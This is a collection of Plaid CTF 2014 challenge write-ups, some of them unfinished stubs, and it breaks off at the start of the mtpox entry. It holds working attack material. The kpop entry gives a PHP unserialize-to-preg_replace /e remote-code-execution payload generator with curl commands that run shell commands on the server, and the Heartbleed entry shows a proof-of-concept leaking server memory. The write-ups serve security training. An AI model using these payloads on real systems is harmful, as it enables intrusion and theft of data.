> We've traveled back far, but this protocol looks familiar... Our reconnaissance team did a great job, they got us [a data capture from the currently running systems and a private key](freya-378469981a7016d6179a844fffe2a82b.tar.bz2) from the server (shell.woo.pctf which resolves to 54.226.73.167). Take a look at the traffic our reconnaissance team picked up, and see if you can get access to The Plague's server, at 54.226.73.167.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-gcc-300-and-freya-250.html>
* <https://fail0verflow.com/blog/2014/plaidctf2014-misc250-freya.html>
# Plaid CTF 2014: g++

**Category:** Reversing
**Points:** 200
**Description:**

> Although it seems like The Plague's projects are open source, it's not quite so simple to figure out what the source code does. We believe [this project](g++-30f6a74ce24ea3605ba7cbec92222a72.tar.bz2) is supposed to print out secret information, but the KEY variable in the Makefile has been lost. Find the key, build the project, get us the information.

## Write-up

_This write-up is made by Xor0X of [HacknamStyle](http://hacknamstyle.net/)._

In the `Makefile` a key can be configured. Using a simple script the key is converted to the header file `key.h`. The character at index `i` with ASCII value `v` is encoded as `K(i, v)`. So the password `test` becomes:

```
K(0,116) // 't'
K(1,101) // 'e'
K(2,115) // 's'
K(3,116) // 't'
```

In `solveme.cpp` this key is then stored using template specialization:

```cpp
template <int i> struct key { S r = 0; };
#define K(i,v) template<> struct key<i> { S r = v; };
```

Hence using `key<i>::r` will return the key at position `i` (or `0` when the index is out of range). The code in `solveme.cpp` continues to use C++ [template metaprogramming](https://en.wikipedia.org/wiki/Template_metaprogramming) to verify this password at compile time. At runtime it checks the result of the compile time operation, and says if they key was correct or not:

```cpp
int main() {
  if (!vv<0>::r)
    // print 16 characters (aka the key)
  else
    std::cout << "Wrong\n";
  return 0;
}
```

From this we can tell the key is 16 characters long. Now we have to reverse engineer all the `#define`s and templates. This can be done by slowly refactoring them. This is tedious work, and we want to be sure our modifications are correct. The first option is to print out the result of `vv<0>::r` and assure our changes do not modify it. We can do better though. Take a look at how `vv<0>::r` is calculated:

```cpp
template <int n> struct vvv { S r = gg<n>::r|gg<n+1>::r|gg<n+2>::r|gg<n+3>::r; };
template <int n> struct vv { S r = vvv<0>::r|vvv<4>::r|vvv<8>::r|vvv<12>::r; };
```

We learn that the value `vv<0>::r` is based on the values `gg<i>::r` with `i` ranging between `0` and `15`. So we can print all the `gg<i>::r` values and assure they never change when we refactor the code. Remark that `vv<0>::r` is zero (and the password is correct) if and only if all the `gg<i>::r` are zero.

### Reversing Results

Reversing the `#define`s is left as an exercise for the reader (they are boring to read about anyway). In the end the definition of `gg` becomes:

```cpp
// 0 <= n <= 15
template <int n> struct gg {
  static const int r = (((hiddenkey<n,n|2>::r)) % 257) - makefilekey<(n>>2),((n)&3)>::rr;
};
```

We can see that both operands of the subtraction must be zero for the key to be valid. Furthermore, `makefilekey` depends on the key supplied in the `Makefile`, while `hiddenkey` only depends on data present in `solveme.cpp`. We don’t need to know how `hiddenkey` is calculated, we simply extract the values for all `n`. Now we want to find a key so that `gg<i>::r` is zero for all `i`. This means `makefilekey<(n>>2),((n)&3)>` must match `hiddenkey<n,n|2>::r` for `n` between `0` and `15`. So how is `makefilekey<a,b>::r` computed?

```cpp
template <int a, int b> struct makefilekey
{
  static const int rr = (lookup<(a)*4>::r * key<b>::r
                      + lookup<(a)*4+1>::r * key<b+4>::r
                      + lookup<(a)*4+2>::r * key<b+8>::r
                      + lookup<(a)*4+3>::r * key<b+12>::r) % 257;
};
```

Here `lookup` only depends on internal data in `solveme.cpp`. What’s crucial here is that `makefilekey<a,b>::r` only depends on four key bytes. In turn this means that `gg<0>::r`, `gg<4>::r`, `gg<8>::r`, and `gg<12>::r` depend only on `key<0>`, `key<4>`, `key<8>`, and `key<12>`. Hence these four key bytes can be bruteforced independently. The same is true for `key<1>`, `key<5>`, `key<9>`, and `key<13>`: They can also be bruteforced independent of the other bytes. In fact we can bruteforce the complete password in groups of four bytes. This is done by extracting the value of `lookup`, performing the calculation in `makefilekey`, and checking if they match the corresponding `hiddenkey` values.

My fully simplified solution can be found in [`solveme-simplified.cpp`](solveme-simplified.cpp).

### Solution

This solution bruteforces the keys in groups of four bytes:

```cpp
#include <stdio.h>

static const int hiddenkey_table[] = {
  15, 25, 172, 31, 100, 17, 225, 137,
  162, 71, 187, 191, 11, 105, 176, 94
};

static const int lookup_table[] = {
  13, 68, 87, 202, 29, 244, 71, 122,
  173, 228, 247, 42, 125, 148, 39, 90
};

static int calc_makefilekey(const char *password, int n) {
  int a = n / 4;
  int b = n % 4;

  return (lookup_table[a*4] * password[b] + lookup_table[a*4+1] * password[b+4]
    + lookup_table[a*4+2] * password[b+8] + lookup_table[a*4+3] * password[b+12]) % 257;
}

int main() {
  char crackedpw[20] = {0};

  // Crack key in groups of 4 chars at once
  for (int off = 0; off < 4; ++off) {
    bool found = false;
    printf("Cracking at offset %d...\n", off);

    for (int c1 = ' '; !found && c1 <= '~'; ++c1) {
      crackedpw[off] = c1;
      for (int c2 = ' '; !found && c2 <= '~'; ++c2) {
        crackedpw[off+4] = c2;
        for (int c3 = ' '; !found && c3 <= '~'; ++c3) {
          crackedpw[off+8] = c3;
          for (int c4 = ' '; !found && c4 <= '~'; ++c4) {
            crackedpw[off+12] = c4;

            if (
              calc_makefilekey(crackedpw, off) == hiddenkey_table[off]
              && calc_makefilekey(crackedpw, off+4) == hiddenkey_table[off+4]
              && calc_makefilekey(crackedpw, off+8) == hiddenkey_table[off+8]
              && calc_makefilekey(crackedpw, off+12) == hiddenkey_table[off+12]
            ) {
              found = true;
            }
          }
        }
      }
    }
  }

  printf("Cracked password: %s\n", crackedpw);
}
```

The solution is `C++_m0re_lyk_C--`.

### Comments

You can also solve this by constructing and solving the linear equations (with the key bytes as unknowns). For example, for the key bytes at position 0, 4, 8, and 12 we have the linear equations:

```
( 13 * k0 +  68 * k4 +  87 * k8 + 202 * k12) Mod 257 =  15
( 29 * k0 + 244 * k4 +  71 * k8 + 122 * k12) Mod 257 = 100
(173 * k0 + 228 * k4 + 247 * k8 +  42 * k12) Mod 257 = 162
(125 * k0 + 148 * k4 +  39 * k8 +  90 * k12) Mod 257 =  11
```

Using the `gaussJordan.py` file [found here](http://anh.cs.luc.edu/331/code/) we can solve this system using Python:

```python
>>> import guassJordan as gj
>>> A = [[13, 68, 87, 202, 15],
     [29, 244, 71, 122, 100],
     [173, 228, 247, 42, 162],
     [125, 148, 39, 90, 11]]
>>> t = gj.matConvert(A, gj.ZMod(257))
>>> gj.gauss_jordanExactField(t)
True
>>> t
[[Mod(1, 257), Mod(0, 257), Mod(0, 257), Mod(0, 257), Mod(67, 257)],
 [Mod(0, 257), Mod(1, 257), Mod(0, 257), Mod(0, 257), Mod(109, 257)],
 [Mod(0, 257), Mod(0, 257), Mod(1, 257), Mod(0, 257), Mod(95, 257)],
 [Mod(0, 257), Mod(0, 257), Mod(0, 257), Mod(1, 257), Mod(95, 257)]]
>>> chr(67), chr(109), chr(95), chr(95)
('C', 'm', '_', '_')
```

These characters match the solution of our bruteforce attack. Note that the Python files required to run this have been mirrored in the directory of this write-up.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-re200-gxx.html>
* <https://docs.google.com/a/google.com/document/d/1jo_taidfAJsCbWUIpU9dYryhtTQr5YLON7BnIr0WN-k/edit>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/g%2B%2B)
* [Indonese](http://blog.rentjong.net/2014/04/plaidctf2014-write-up-g-reversing200.html)
* <http://j00ru.vexillium.org/dump/ctf/g++.cc>
# Plaid CTF 2014: gcc

**Category:** Reversing
**Points:** 300
**Description:**

> This is bad. Very bad. You travel back in time, only to see that The Plague has finagled his way to the gcc dev team. What sort of mischief he can cause for the future from this point of power is hard to say... find out what he's up to immediately! [Here](gcc-1f056eb86b487b65ad92d89738ec5edc.tar.gz)'s a copy of GCC. We're pretty sure he's running something at <https://107.21.133.9/>.

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-gcc-300-and-freya-250.html>
* <https://gist.github.com/hellok/10723754>
# Plaid CTF 2014: graphs

**Category:** Crypto
**Points:** 200
**Description:**

> In this era, block ciphers hadn't even been invented. The Plague created [this system](graphs-0011fa3a98e9d40d4a671807eb817ca0.tar.bz2) based on problems he knew to be NP hard, but there must be something you can do to decode his messages.

## Write-up

So, first of all, what are our files?

* Ciphertext - encoded array of 1024 big numbers.
* Plaintext - the sum of 64 numbers from the cleartext.
* Public key - encoded graph (list of lists).
* Private key - indexes of numbers in the cleartext, which generate a cleartext.
* A `genkey.py` script that performs the encryption.

So we have the public key with 1024 vertices, but we need only 64 of them.

Let’s take a closer look at how the key generation works:

```py
vertices = range(self.keylen)
privkey = random.sample(vertices,self.keylen>>4)
#privkey = random 64 vertices

tocover = set(vertices).difference(set(privkey))
#tocover = all others vertices

G = [0]*self.keylen
for v in vertices:
  G[v] = []
#just graph init

#!!! the most important part !!!
while len(tocover) > 0:
  src = random.choice(privkey)
  dst = random.choice(list(tocover))
  G[src].append(dst)
  G[dst].append(src)
  tocover = tocover.difference(set([dst]))
```

So `len(tocover) = 1024 - 64 = 960`. Let’s take 2 random vertices, 1 from the private key, 1 from the `tocover` set, and we ‘connect’ them. We can then compute lengths of private keys vertices (count of connected element) = 960 / 64 = 15 (will be same for all `keylen`). Now we know, that our `privkey` vertices have 15 elements, but what with others?

```py
others = list(set(vertices).difference(set(privkey)))
for o in others:
  for n in others:
    if random.getrandbits(5) == 0:
      if o not in G[n]:
        G[n].append(o)
        G[o].append(n)
```

We connect two vertices `o` and `n` only in 1/32 of all cases (`if random.getrandbits(5) == 0`). But our graph is symmetric, so actually it’s in 1/16 of all cases. Okay, so for every vertice `o` we have about `960 / 16 = 60` connected elements versus 15 elements in private key.

Now we need only get indexes of 64 vertices with the smallest count of connected elements. I did it this way:

```py
privkey = []
for index, el in enumerate(self.pubkey):
  if len(el) <= 30:
    privkey.append(index)
self.privkey = privkey
```

Let’s decrypt the ciphertext using that key `2275629599429195325551385405029036171782046085131052214556340540961662`. The cleartext is:

```
The flag is: 3veryb0dy_poops~
```

The flag is `3veryb0dy_poops~`.

## Other write-ups and resources

* <https://fail0verflow.com/blog/2014/plaidctf2014-crypto200-graphs.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/crypto/graphs)
* [Russian](https://forum.reverse4you.org/showthread.php?t=1684)
* <http://piggybird.net/2014/04/plaidctf-2014-reversing-300-paris/>
# Plaid CTF 2014: halphow2js

**Category:** Web
**Points:** 200
**Description:**

> Javascript is everywhere. But there is [one strange javascript blob](https://54.196.246.17:8001/) we have been seeing pop up on servers throughout the ages. We're pretty sure The Plague must be involved.
>
> Note: we know the cert displays a warning - that isn't important.

## Write-up

[The HTML source for the website linked to in the description](index.html) reveals [`script.js`](script.js), a polyglot JavaScript file that runs in both the browser and in Node.js.

Reading through the code makes it clear that the client-side section of the script prompts the user for input five times, and then submits that data to the server. If the input matches certain conditions, the flag is returned, else, the process starts over.

The data is sent using a GET request to `https://54.196.246.17:8001/myajax?x=1&y=2&z=3&w=4&ww=5`. The server-side section of the script validates these URL query string parameters as follows: if `FLAG` (a value unknown to us) is equal to `filter(query.x, query.y, query.z, query.w, query.ww)`, then the flag is revealed.

Let’s take a closer look at that `filter` function:

```js
function filter() {
  var args = [].slice.apply(arguments).sort().filter(function(x, i, a) {
    return a.indexOf(x) == i;
  });
  if (args.length != 5) return "uniq";

  var flag = false;
  args.map(function(x) {
    flag |= x >= 999;
  });
  if (flag) return "big";

  var m = args.map(mystop);

  if (m.filter(function(x, i) { return m[2] + 3 * i == x; }).length < 3) {
    return "unsexy";
  }
  if (m.filter(function(x, i) { return x == args[i]; }).length < 3) {
    return "hippopotamus";
  }
  if (m.filter(function(x, i) { return x > m[i-1]; }).length > 3) {
    return "banana phone";
  }

  return FLAG;
}
```

We can make the following observations:

* First, the arguments are lexicographically sorted. This effectively means that `?x=1&y=2&z=3&w=4&ww=5` and `?x=5&y=4&z=3&w=2&ww=1` have the same effect, which reduces the number of combinations to test in a brute-force scenario.
* It takes exactly five unique arguments. If not, the function exits early, and we won’t get to the flag. Once again, this makes brute-forcing a bit easier.
* If for any of the arguments `x` the expression `x >= 999` holds true, the function exits early, and we won’t get to the flag.
* `mystop(x)` is then called for each argument `x`, which can take several minutes depending on the value of `x`. The resulting list of arguments (`m`) must match certain conditions, else the function exits early, and we won’t get to the flag.

At this point it’s tempting to start bruteforcing by sending all possible sets of five numeric values below `999` to the server. That’s several trillions of possible combinations, though… It also doesn’t help that the server-side code only sends a response after at least 2 seconds. Brute-forcing is not exactly feasible for this challenge.

Remember the `query.x`, `query.y`, `query.z`, `query.w`, and `query.ww` values that are validated on the server-side? [They’re string values](http://nodejs.org/api/querystring.html#querystring_querystring_parse_str_sep_eq_options), and the script never explicitly casts them into numbers. This means we can pick any string values `x` for the parameters, as long as `x >= 999` evaluates to `false`.

So instead of trying to find the perfect combination of numbers, we can just pick any five strings that can be coerced into numbers, and then format them in different ways until all validation checks are passed. For example, the number `5` can also be written as `5.`, `5.0`, `5.00`, or `5e0` in JavaScript. And because the values are strings that are coerced to numbers (equivalent to `Number(string)`) we can even pad the values with whitespace, e.g. `" 5"` or `"5 "` instead of `"5"`.

After some manual fiddling with various numbers and formats, we found a working set of values:

```js
// This code assumes the `filter` function and its dependencies are declared as
// in the provided `script.js`.
var FLAG = 'Congratulations!';
console.log(filter('2.0', '2.00', '2.000', '7', '76'));
// → 'Congratulations!'
```

Now we can open <https://54.196.246.17:8001/> and enter the values one by one, after which the flag is shown in an alert box. But using `curl` is simpler:

```bash
$ curl --insecure 'https://54.196.246.17:8001/myajax?x=2.0&y=2.00&z=2.000&w=7&ww=76'
w00t_i_are_mastar_web_hackar
```

The flag is `w00t\_i\_are\_mastar\_web\_hackar`.

## Other write-ups and resources

* <http://balidani.blogspot.com/2014/04/plaidctf-halphow2js-writeup.html>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/halphow2js)
* <http://j00ru.vexillium.org/dump/ctf/halphow2js.txt>
# Plaid CTF 2014: harry_potter

**Category:** Pwnables
**Points:** 300
**Description:**

> If only we could get into [this system](harry_potter-2e0391597fb1d20ebf79b7d77c21b06e.tar.bz2), running at 54.198.150.4:666, we might get an idea of where The Plague has been keeping the Prime Factorizer.

## Write-up

(TODO)

## Other write-ups and resources

* <http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/>
* <http://blog.accuvant.com/jdrakeaccuvant/plaid-ctf-2014-harry_potter-challenge/>
* <http://blog.yancomm.net/2014/04/plaidctf-2014-harry-potter-pwn300.html>
* <http://j00ru.vexillium.org/dump/ctf/harry_potter.zip>
# Plaid CTF 2014: Heartbleed

**Category:** Misc
**Points:** 10
**Description:**

> Our hearts are bleeding. But instead of bleeding password bytes, they're bleeding flags. Please recover our flags so we don't bleed to death before we can update to 1.0.1-g. Site is up at <https://54.82.147.138:45373/>.
>
> (The flag format is `flag{...}`.)

## Write-up

The challenge name makes it pretty clear that the server is vulnerable to the [the Heartbleed bug](http://heartbleed.com/). Let’s use the famous [Heartbleed proof of concept script](heartbleed.py) and see what kind of data the server leaks:

```bash
$ ./heartbleed.py -p 45373 54.82.147.138
Connecting...
Sending Client Hello...
Waiting for Server Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 837
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Sending heartbeat request...
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response:
	0000: 02 40 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73  .@.flag{hey_guis
	0010: 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72  e_we_made_a_hear
	0020: 74 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79  tbleed}.flag{hey
	0030: 5F 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61  _guise_we_made_a
	0040: 5F 68 65 61 72 74 62 6C 65 65 64 7D 00 66 6C 61  _heartbleed}.fla
	0050: 67 7B 68 65 79 5F 67 75 69 73 65 5F 77 65 5F 6D  g{hey_guise_we_m
	0060: 61 64 65 5F 61 5F 68 65 61 72 74 62 6C 65 65 64  ade_a_heartbleed
	0070: 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65  }.flag{hey_guise
	0080: 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74  _we_made_a_heart
	0090: 62 6C 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F  bleed}.flag{hey_
	00a0: 67 75 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F  guise_we_made_a_
	…
	3fc0: 66 6C 61 67 7B 68 65 79 5F 67 75 69 73 65 5F 77  flag{hey_guise_w
	3fd0: 65 5F 6D 61 64 65 5F 61 5F 68 65 61 72 74 62 6C  e_made_a_heartbl
	3fe0: 65 65 64 7D 00 66 6C 61 67 7B 68 65 79 5F 67 75  eed}.flag{hey_gu
	3ff0: 69 73 65 5F 77 65 5F 6D 61 64 65 5F 61 5F 68 65  ise_we_made_a_he

WARNING: server returned more data than it should; server is vulnerable!
```

The flag is `flag{hey\_guise\_we\_made\_a\_heartbleed}`.

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/heartbleed)
* <https://github.com/hackerclub/writeups/blob/master/plaidctf-2014/Heartbleed/WRITEUP-pipecork.md>
* <http://csrc.tamuc.edu/css/?p=152>
* <https://docs.google.com/document/d/1Y0wGrFkGUsK9Gzqh4sQnMHZDgWfMMvfPUN-vVjPNDfI/edit?pli=1>
* <http://akaminsky.net/plaidctf-quals-2014-misc-10-heartbleed/>
* [Spanish](http://crackinglandia.blogspot.com.ar/2014/04/plaidctf-2014-heartbleed-misc-10-pts.html)
# Plaid CTF 2014: hudak

**Category:** Reversing
**Points:** 250
**Description:**

> Can you reverse [this program](hudak-c3c6dd04f699cc01c0d4f547f2155ddf.tar.bz2) and find out what The Plague was working on?

## Write-up

(TODO)

## Other write-ups and resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/reversing/hudak)
* [Russian](https://forum.reverse4you.org/showthread.php?t=1682)
# Plaid CTF 2014: jackshit

**Category:** Pwnables
**Points:** 200
**Description:**

> You have travelled back in time only to find The Plague has secured [his services](jackshit-986d2961b93c3db2688f754fd7d8298e.gz) (at 54.198.56.199:1282) with the current state of the art in system call filtering. Can you break in to find a clue as to where he might be?
>
> (This is 32-bit Ubuntu instance, with [this libc](libc-47b4e38cb3c4bce477e52368c50972c8.so.6).)

## Write-up

(TODO)

## Other write-ups and other resources

* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/jackshit)
* <http://pastebin.com/eVZeRgyE>
# Plaid CTF 2014: kappa

**Category:** Pwnables
**Points:** 275
**Description:**

> There's got to be a way to get into [this service](kappa-f2fdf7fcc074cb0c66c3d80a48286450.tar.bz2) set up by the Plague at 54.80.112.128:1313. Can you find it?

## Write-up

(TODO)

```bash
$ nc 54.80.112.128 1313
Thank you for helping test CTF plays Pokemon! Keep in mind that this is currently in alpha which means that we will only support one person playing at a time. You will be provided with several options once the game begins, as well as several hidden options for those true CTF Plays Pokemon fans ;). We hope to expand this in the coming months to include even more features!  Enjoy! :)
Choose an Option:
1. Go into the Grass
2. Heal your Pokemon
3. Inpect your Pokemon
4. Release a Pokemon
5. Change Pokemon artwork
```

```
11:30:24 <saelo> since I couldn't find a writeup, how was kappa supposed to be solved?
11:30:43 <saelo> I got eip control but couldn't really find anything for NX bypass...
11:34:25 <saelo> couldn't find something for stack pivoting + no mmap or similar in plt
11:51:08 <Reinhart> saelo: we constructed an infoleak, found address of system() using that, then set the print_info callback for a pokemon to system(). then make sure the pokemon's name is a shell cmd.
11:51:39 <saelo> Reinhart: cool, that was my idea too, what did you use for the info leak?
11:52:26 <Reinhart> saelo: the attack name was a pointer-to-pointer-to-string, we overwrote it with a pointer to within another pokemon's artwork, then we could change that artwork to leak data up to the next null byte by printing the pokemon
```

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln>
* <http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/>
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/pwnables/kappa)
* <http://j00ru.vexillium.org/dump/ctf/kappa.py>
* <http://pastebin.com/VUKdnkLz>
# Plaid CTF 2014: kpop

**Category:** Web
**Points:** 200
**Description:**

> Sometimes, the Plague leaves some of his old stuff up and running. We found a [K-Pop lyrics website](http://54.234.123.205/) the Plague wrote back when he was learning to program. It was [open-source](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2), too! We believe there might be something important in `/home/flag/flag`. Could you get it for us?

## Write-up

[The `/import.php` endpoint](http://54.234.123.205/import.php) has a form that accepts user input. Its source code (part of [the provided tarball](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2)) calls `User::addLyrics($newperms)` when the form is submitted. Here’s the source code for this class:

```php
class User {
  static function addLyrics($lyrics) {
    $oldlyrics = array();
    if (isset($_COOKIE['lyrics'])) {
      $oldlyrics = unserialize(base64_decode($_COOKIE['lyrics']));
    }
    foreach ($lyrics as $lyric) $oldlyrics []= $lyric;
    setcookie('lyrics', base64_encode(serialize($oldlyrics)));
  }
  static function getLyrics() {
    if (isset($_COOKIE['lyrics'])) {
      return unserialize(base64_decode($_COOKIE['lyrics']));
    }
    else {
      setcookie('lyrics', base64_encode(serialize(array(1, 2))));
      return array(1, 2);
    }
  }
};
```

A-ha! It performs serialization of user-controlled input (the value of the `lyrics` cookie).

[The provided source code](kpop-686da11b170e7054ebee30a218d6490f.tar.bz2) also contains an `OutputFilter` class in `classes.php` that takes two arguments: a pattern and a replacement. These arguments are then passed to `preg_replace()`. If we can somehow manage to use the deprecated `/e` modifier for `preg_replace()`, this would enable remote code execution. [The PHP documentation describes this ‘feature’ as follows](http://php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval):

> If this deprecated modifier is set, `preg_replace()` does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.

Adding one and one together, it’s possible to craft an exploit that uses the unsafe serialization vulnerability to trigger the remote code execution vulnerability. First, we create a custom value for the `lyrics` cookie. This value must be equal to `base64_encode(serialize($lyrics))` for an instance of any `Lyrics` object.

Let’s make a copy of `classes.php` and save it as [`classes-patched.php`](classes-patched.php). I made a few changes, so that it returns a value for the `lyrics` cookie containing a remote code execution payload:

```diff
--- classes.php	2014-04-11 05:46:37.000000000 +0200
+++ classes-patched.php	2014-04-12 13:33:37.000000000 +0200
@@ -1,5 +1,15 @@
 <?php

+// Modern versions of PHP log this warning:
+// > PHP Deprecated: `preg_replace()`: The `/e` modifier is deprecated, use
+// > `preg_replace_callback` instead in `classes.php` on line 11
+// Turn off all error reporting to avoid this.
+error_reporting(0);
+
+// Allow passing a shell argument containing the desired payload, e.g.
+// $ php classes-patched.php 'cat /etc/passwd'
+$command = isset($argv[1]) ? $argv[1] : 'ls -lsa';
+
 class OutputFilter {
   protected $matchPattern;
   protected $replacement;
@@ -57,9 +67,13 @@
   protected $group;
   protected $url;
   function __construct($name, $group, $url) {
+    global $command;
     $this->name = $name; $this->group = $group;
     $this->url = $url;
-    $fltr = new OutputFilter("/\[i\](.*)\[\/i\]/i", "<i>\\1</i>");
+    $fltr = new OutputFilter(
+      "/^./e",
+      'system("' . str_replace('"', '\\"', $command) . '")'
+    );
     $this->logger = new Logger(new LogWriter_File("song_views", new LogFileFormat(array($fltr), "\n")));
   }
   function __toString() {
@@ -156,3 +170,8 @@
   }
 };

+// Create a dummy `Lyrics` instance.
+$song = new Song('name', 'group', 'url');
+$lyric = new Lyrics('lyrics', $song);
+// Get its serialized form, base64-encode it, and print it.
+echo base64_encode(serialize($lyric)) . PHP_EOL;
```

Here’s an example of its output:

```bash
$ php classes-patched.php 'pwd'
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
/ctfs/write-ups/plaid-ctf-2014/kpop
```

Note that it doesn’t just print the desired cookie value — it also executes the payload on our local system as an unfortunate side effect. To hide this part of the output, we can pipe to `head -n1`:

```bash
$ php classes-patched.php 'pwd' | head -n1
Tzo2OiJMeXJpY3MiOjI6e3M6OToiACoAbHlyaWNzIjtzOjY6Imx5cmljcyI7czo3OiIAKgBzb25nIjtPOjQ6IlNvbmciOjQ6e3M6OToiACoAbG9nZ2VyIjtPOjY6IkxvZ2dlciI6MTp7czoxMjoiACoAbG9nd3JpdGVyIjtPOjE0OiJMb2dXcml0ZXJfRmlsZSI6Mjp7czoxMToiACoAZmlsZW5hbWUiO3M6MTA6InNvbmdfdmlld3MiO3M6OToiACoAZm9ybWF0IjtPOjEzOiJMb2dGaWxlRm9ybWF0IjoyOntzOjEwOiIAKgBmaWx0ZXJzIjthOjE6e2k6MDtPOjEyOiJPdXRwdXRGaWx0ZXIiOjI6e3M6MTU6IgAqAG1hdGNoUGF0dGVybiI7czo1OiIvXi4vZSI7czoxNDoiACoAcmVwbGFjZW1lbnQiO3M6MTM6InN5c3RlbSgicHdkIikiO319czo3OiIAKgBlbmRsIjtzOjE6IgoiO319fXM6NzoiACoAbmFtZSI7czo0OiJuYW1lIjtzOjg6IgAqAGdyb3VwIjtzOjU6Imdyb3VwIjtzOjY6IgAqAHVybCI7czozOiJ1cmwiO319
```

Now we can start sending requests to the vulnerable server using the generated cookie value. There’s no need to enter anything in the “data to import” form field.

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'ls -lsa' | head -n1)" 'http://54.234.123.205/import.php'
total 52
4 drwxr-xr-x  3 root root 4096 Apr 12 07:55 .
4 drwxr-xr-x 12 root root 4096 Apr 11 19:40 ..
4 -rw-r--r--  1 root root 1150 Apr 11 19:50 add_song.php
8 -rw-r--r--  1 root root 4308 Apr 12 07:55 classes.php
4 -rw-r--r--  1 root root   93 Apr 11 19:50 data.php
4 -rw-r--r--  1 root root  417 Apr 11 19:50 export.php
4 -rw-r--r--  1 root root  864 Apr 11 19:50 import.php
4 -rw-r--r--  1 root root  177 Apr 11 19:41 index.html
4 -rw-r--r--  1 root root  423 Apr 11 19:50 index.php
4 drw-rw-rw-  2 root root 4096 Apr 12 07:52 logs
4 -rw-r--r--  1 root root  454 Apr 11 19:50 song.php
4 -rw-r--r--  1 root root  777 Apr 11 19:50 songs.php
<html>
  <head>
    <title>The Plague's KPop Fan Page - Imported Songs</title>
  </head>
  <body>
    <p>Your songs have been imported! Go back to the <a href="songs.php">songs</a> page to see them!</p>
  </body>
</html>
```

The challenge description mentioned `/home/flag/flag`. What could it be?

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
/home/flag/flag: ASCII text
<html>
…
```

Surprise — it’s a plain text file! Who knew?! Let’s view its contents:

```bash
$ curl --data 'data=' --cookie "lyrics=$(php classes-patched.php 'file /home/flag/flag' | head -n1)" 'http://54.234.123.205/import.php'
One_of_our_favorite_songs_is_bubble_pop
<html>
…
```

The flag is `One\_of\_our\_favorite\_songs\_is\_bubble\_pop`.

## Other write-ups and resources

* <https://blog.skullsecurity.org/2014/plaidctf-writeup-for-web-200-kpop-bad-deserialization>
* <http://akaminsky.net/plaidctf-quals-2014-web-200-kpop/>
* [Solution in PHP by @manhluat93](https://gist.github.com/anonymous/31bfc4eea34fb213e4bc)
* [Source code for this challenge, released after the CTF](https://github.com/pwning/plaidctf2014/tree/master/web/kPOP)
* <http://blog.dragonsector.pl/2014/04/plaidctf-2014-kpop-and-reeekeee.html>
# Plaid CTF 2014: moscow

**Category:** Reversing
**Points:** 250
**Description:**

> While searching for The Plague and the Prime Factorizer, you come across [this program](moscow-f76df876f9309359185541528ae0d923.tar.bz2). It is so fiendish it must have something to do with your quest.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Plaid CTF 2014: mtpox

**Category:** Web
**Points:** 150
**Description:**

> The Plague has traveled back in time to create a cryptocurrency before Satoshi does in an attempt to quickly gain the resources required for his empire. As you step out of your time machine, you learn [his exchange](http://54.211.6.40/) has stopped trades, due to some sort of bug. However, if you could break into the database and show a different story of where the coins went, we might be able to stop The Plague.
>
> Hint: try reading things using `?page=`.

## Write-up

### Source code disclosure vulnerability

